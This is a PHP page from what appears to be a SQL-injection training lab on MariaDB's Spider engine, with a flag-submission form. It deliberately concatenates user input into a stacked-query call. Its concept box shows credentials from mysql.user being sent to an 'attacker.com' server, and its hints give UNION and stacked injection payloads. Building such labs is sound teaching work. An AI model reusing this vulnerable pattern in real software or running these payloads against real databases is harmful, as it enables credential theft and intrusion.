<?php
require_once __DIR__ . '/../../includes/db.php';

$mode = $_GET['mode'] ?? 'black';
$verify_error = null;

/* =====================
   FLAG VERIFY
===================== */
if (isset($_POST['flag'])) {
    $submitted = $_POST['flag'];

    $res = mysqli_query(
        $conn,
        "SELECT key_value FROM federation_keys WHERE id=1 LIMIT 1"
    );
    $row = mysqli_fetch_assoc($res);

    if ($row && $submitted === $row['key_value']) {
        $_SESSION['mariadb_lab3_solved'] = true;
        header("Location: " . url_lab_from_slug("mariadb/lab3", $mode, $_GET['ref'] ?? ''));
        exit;
    } else {
        $verify_error = "Incorrect. Keep trying!";
    }
}
?>

<!-- Lab Description -->
<div class="card">
    <h3>Lab 3. Spider Engine: Federated Injection</h3>

    <h4>Scenario</h4>
    <p>
        A server monitoring dashboard displays the status of nodes in a MariaDB cluster.
        The infrastructure team uses the <strong>Spider storage engine</strong> to create
        federated tables that transparently query data across multiple MariaDB instances.
    </p>
    <p>
        Spider tables look like local tables but actually forward queries to remote servers.
        In a real attack scenario, an attacker who can execute stacked queries could create
        a Spider table pointing to their own malicious MySQL server, enabling data exfiltration
        or cross-instance pivoting:
    </p>

    <div class="terminal">
        <div class="terminal-header">
            <span class="terminal-dot red"></span>
            <span class="terminal-dot yellow"></span>
            <span class="terminal-dot green"></span>
            <span class="terminal-title">Spider Engine. Concept</span>
        </div>
        <div class="terminal-body">
            <span class="prompt">mariadb&gt; </span>CREATE SERVER attacker_srv<br>
            &nbsp;&nbsp;FOREIGN DATA WRAPPER mysql<br>
            &nbsp;&nbsp;OPTIONS (HOST 'attacker.com', PORT 3306, DATABASE 'exfil');<br><br>
            <span class="prompt">mariadb&gt; </span>CREATE TABLE exfil_pipe (<br>
            &nbsp;&nbsp;data TEXT<br>
            ) ENGINE=SPIDER COMMENT='srv "attacker_srv"';<br><br>
            <span class="prompt">mariadb&gt; </span>INSERT INTO exfil_pipe SELECT password FROM mysql.user;<br>
            <span class="comment">-- Data forwarded to attacker's server!</span>
        </div>
    </div>

    <h4>Objective</h4>
    <p>
        The server status lookup uses <code>mysqli_multi_query()</code>, enabling
        <strong>stacked queries</strong>. Use this to extract the <strong>federation key</strong>
        from the hidden <code>federation_keys</code> table. You will need to chain a second
        query using UNION to exfiltrate the data.
    </p>

    <h4>Hints</h4>
    <span class="hint-toggle" data-hint="hint1">&#128161; Click for hints</span>
    <div id="hint1" class="hint-content">
        1. The app uses <code>mysqli_multi_query()</code>: stacked queries work!<br>
        2. First, enumerate tables: <code>1; SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()</code><br>
        3. The first query returns 2 columns (hostname, status).<br>
        4. UNION approach: <code>' UNION SELECT key_value, NULL FROM federation_keys -- -</code><br>
        5. Stacked approach: <code>1'; CREATE TABLE tmp AS SELECT * FROM federation_keys; -- -</code> then query tmp.
    </div>
</div>

<!-- Verify Flag -->
<div class="card">
    <h4>Submit Flag</h4>
    <form method="POST" class="form-row">
        <input type="text" name="flag" class="input" placeholder="Enter the flag..." required>
        <button type="submit" class="btn btn-primary">Verify</button>
    </form>

    <?php if ($verify_error): ?>
        <div class="result-error result-box"><?= htmlspecialchars($verify_error) ?></div>
    <?php endif; ?>
</div>

<!-- Solved Banner -->
<?php if (!empty($_SESSION['mariadb_lab3_solved'])): ?>

<div class="solved-banner">
    <span class="solved-icon">&#127942;</span>
    <div>
        <div class="solved-title">Lab Solved!</div>
        <div class="solved-desc">You exploited stacked queries and UNION injection to extract the federation key. In a real scenario, the Spider engine could enable cross-instance data exfiltration.</div>
    </div>
</div>

<?php else: ?>

<!-- Vulnerable Query Interface -->
<div class="card">
    <h4>Server Status Lookup</h4>
    <form method="POST" class="form-row">
<input type="text" name="host" class="input" placeholder="Enter hostname filter (try: node)" value="<?= htmlspecialchars($_POST['host'] ?? '') ?>">
        <button type="submit" class="btn btn-primary">Check Status</button>
    </form>
</div>

<?php
if (isset($_POST['host'])) {
    $host = $_POST['host'];

    // INTENTIONALLY VULNERABLE: stacked queries enabled via mysqli_multi_query
    $query = "SELECT hostname, status FROM servers WHERE hostname LIKE '%$host%'";

    // Show the executed query in a terminal block
    echo '<div class="terminal query-output">';
    echo '  <div class="terminal-header">';
    echo '    <span class="terminal-dot red"></span>';
    echo '    <span class="terminal-dot yellow"></span>';
    echo '    <span class="terminal-dot green"></span>';
    echo '    <span class="terminal-title">MariaDB Query</span>';
    echo '  </div>';
    echo '  <div class="terminal-body" data-highlight="sql">';
    echo '    <span class="prompt">mariadb&gt; </span>' . htmlspecialchars($query);
    echo '  </div>';
    echo '</div>';

    // Execute with multi_query (stacked queries!)
    try {
    $success = mysqli_multi_query($conn, $query);

    if (!$success) {
        echo '<div class="result-error result-box">';
        echo '<strong>MariaDB Error:</strong><br>' . htmlspecialchars(mysqli_error($conn));
        echo '</div>';
    } else {
        $resultIndex = 0;
        do {
            $result = mysqli_store_result($conn);
            if ($result) {
                $rows = [];
                while ($row = mysqli_fetch_assoc($result)) {
                    $rows[] = $row;
                }
                mysqli_free_result($result);

                if (!empty($rows)) {
                    if ($resultIndex > 0) {
                        echo '<div class="result-warning result-box"><strong>Additional Result Set #' . $resultIndex . ':</strong></div>';
                    }
                    echo '<table class="result-table">';
                    // Dynamic headers from column names
                    $headers = array_keys($rows[0]);
                    echo '<tr>';
                    foreach ($headers as $h) {
                        echo '<th>' . htmlspecialchars($h) . '</th>';
                    }
                    echo '</tr>';
                    foreach ($rows as $row) {
                        echo '<tr>';
                        foreach ($row as $val) {
                            echo '<td>' . htmlspecialchars($val ?? '') . '</td>';
                        }
                        echo '</tr>';
                    }
                    echo '</table>';
                }
                $resultIndex++;
            }
        } while (mysqli_next_result($conn));

        // Check for errors from subsequent statements
        if (mysqli_error($conn)) {
            echo '<div class="result-error result-box">';
            echo '<strong>MariaDB Error:</strong><br>' . htmlspecialchars(mysqli_error($conn));
            echo '</div>';
        }

        if ($resultIndex === 0) {
            echo '<div class="result-warning result-box">No servers found.</div>';
        }
    }
    } catch (mysqli_sql_exception $e) {
        echo '<div class="result-error result-box">';
        echo '<strong>MariaDB Error:</strong><br>' . htmlspecialchars($e->getMessage());
        echo '</div>';
    }
}
?>

<?php endif; ?>
